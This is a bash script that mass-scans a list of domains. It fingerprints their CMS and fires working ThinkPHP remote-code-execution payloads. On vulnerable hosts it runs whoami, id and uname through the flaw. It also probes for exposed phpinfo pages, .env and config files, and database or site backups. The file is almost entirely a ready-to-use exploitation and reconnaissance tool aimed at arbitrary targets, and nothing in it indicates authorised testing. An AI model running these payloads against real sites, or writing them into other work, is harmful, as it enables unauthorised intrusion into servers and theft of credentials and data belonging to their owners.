#!/bin/bash
TARGETS="/tmp/targets.txt"
OUTFILE="/tmp/full_scan_results.txt"
echo "CMS Scan Results - $(date)" > "$OUTFILE"
echo "========================================" >> "$OUTFILE"

scan_target() {
  local domain="$1"
  {
    echo "========== $domain =========="
    
    local resp_header=$(curl -sI --max-time 8 "http://$domain" 2>/dev/null)
    local http_code=$(echo "$resp_header" | grep "^HTTP" | tail -1 | awk "{print \$2}")
    local server=$(echo "$resp_header" | grep -i "^server:" | sed "s/.*: //" | tr -d "\r")
    echo "HTTP: $http_code"
    echo "Server: $server"
    
    local html=$(curl -sL --max-time 10 "http://$domain" 2>/dev/null)
    local title=$(echo "$html" | grep -o "<title>[^<]*</title>" | head -1 | sed "s/<[^>]*>//g" | tr -d "\r" | sed "s/^[[:space:]]*//;s/[[:space:]]*$//")
    echo "Title: $title"
    
    # CMS Detection
    if echo "$html" | grep -qi "thinkphp\|ThinkPHP"; then echo "CMS: ThinkPHP"; fi
    if echo "$html" | grep -qi "pboot\|Pboot\|pbootcms"; then echo "CMS: PbootCMS"; fi
    if echo "$html" | grep -qi "dede\|DedeCMS\|织梦"; then echo "CMS: DedeCMS"; fi
    if echo "$html" | grep -qi "wp-content\|wp-includes\|WordPress"; then echo "CMS: WordPress"; fi
    if echo "$html" | grep -qi "empire\|EmpireCMS\|帝国"; then echo "CMS: EmpireCMS"; fi
    if echo "$html" | grep -qi "discuz\|Discuz!"; then echo "CMS: Discuz!"; fi
    if echo "$html" | grep -qi "metinfo\|MetInfo"; then echo "CMS: MetInfo"; fi
    if echo "$html" | grep -qi "eyoucms\|EyouCMS\|易优"; then echo "CMS: EyouCMS"; fi
    if echo "$html" | grep -qi "phpcms\|PHPCMS"; then echo "CMS: PHPCMS"; fi
    
    # ThinkPHP RCE (primary exploit)
    local tp_rce=$(curl -s --max-time 5 "http://$domain/index.php?s=index/think/app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=echo%20TP_RCE_TEST" 2>/dev/null)
    if echo "$tp_rce" | grep -q "TP_RCE_TEST"; then
      echo "!! THINKPHP RCE VULNERABLE !!"
      local whoami=$(curl -s --max-time 5 "http://$domain/index.php?s=index/think/app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=whoami" 2>/dev/null)
      echo "  whoami: $whoami"
      local id=$(curl -s --max-time 5 "http://$domain/index.php?s=index/think/app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id" 2>/dev/null)
      echo "  id: $id"
      local uname=$(curl -s --max-time 5 "http://$domain/index.php?s=index/think/app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=uname%20-a" 2>/dev/null)
      echo "  uname: $uname"
    fi
    
    # ThinkPHP 5.0.23 variant
    local tp_var=$(curl -s --max-time 5 "http://$domain/index.php?s=captcha&method=index&c=calc&f=system&d[]=echo%20TP_VAR_TEST" 2>/dev/null)
    if echo "$tp_var" | grep -q "TP_VAR_TEST"; then
      echo "!! ThinkPHP 5.0.23 RCE VULNERABLE (captcha variant) !!"
    fi
    
    # Another ThinkPHP variant  
    local tp_var2=$(curl -s --max-time 5 "http://$domain/public/index.php?s=index/think/app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=echo%20TP_PUB_TEST" 2>/dev/null)
    if echo "$tp_var2" | grep -q "TP_PUB_TEST"; then
      echo "!! ThinkPHP RCE VULNERABLE (/public path) !!"
    fi
    
    # Struts2 check (for .action/.do paths)
    local action_resp=$(curl -s --max-time 5 "http://$domain/doesnotexist.action" 2>/dev/null)
    if echo "$action_resp" | grep -qi "struts\|ognl\|Struts"; then
      echo "Possible Struts2 framework"
    fi
    
    # Check phpinfo exposure
    for p in phpinfo.php info.php test.php php_info.php i.php p.php; do
      local body=$(curl -s --max-time 5 "http://$domain/$p" 2>/dev/null)
      if echo "$body" | grep -qi "phpinfo\|PHP Version\|PHP License\|PHP Extension"; then
        echo "!! $p: PHPINFO EXPOSED !!"
      fi
    done
    
    # Check common admin/config paths
    for p in .env config.json config.php database.php db.php admin admin.php manager login.php setup.php install.php robots.txt sitemap.xml; do
      local code=$(curl -s -o /dev/null -w "%{http_code}" --max-time 5 "http://$domain/$p" 2>/dev/null)
      if [ "$code" != "404" ] && [ "$code" != "000" ]; then
        echo "  /$p: $code"
      fi
    done
    
    # Backup files check
    for ext in .bak .old .swp "~" .save .txt .tar.gz .zip .sql .gz; do
      for file in config.php admin.php index.php db.php database.php web www backup site.sql; do
        local code=$(curl -s -o /dev/null -w "%{http_code}" --max-time 3 "http://$domain/$file$ext" 2>/dev/null)
        if [ "$code" != "404" ] && [ "$code" != "000" ]; then
          echo "  /$file$ext: $code (BACKUP!)"
        fi
      done
    done
    
    echo ""
  } >> "$OUTFILE"
  echo "Scanned: $domain"
}

echo "Starting scan of $(wc -l < "$TARGETS") targets..."
while IFS= read -r domain; do
  [ -z "$domain" ] && continue
  scan_target "$domain"
done < "$TARGETS"
echo "SCAN COMPLETE"
